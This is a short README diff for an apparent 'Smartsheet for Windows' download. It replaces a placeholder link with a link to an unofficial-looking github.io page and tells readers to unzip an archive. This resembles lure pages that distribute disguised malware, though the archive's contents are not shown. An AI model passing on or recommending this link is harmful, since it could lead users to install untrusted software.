@@ -6,7 +6,7 @@ Smartsheet for Windows brings powerful project management, work tracking, and co
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://smartsheet-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
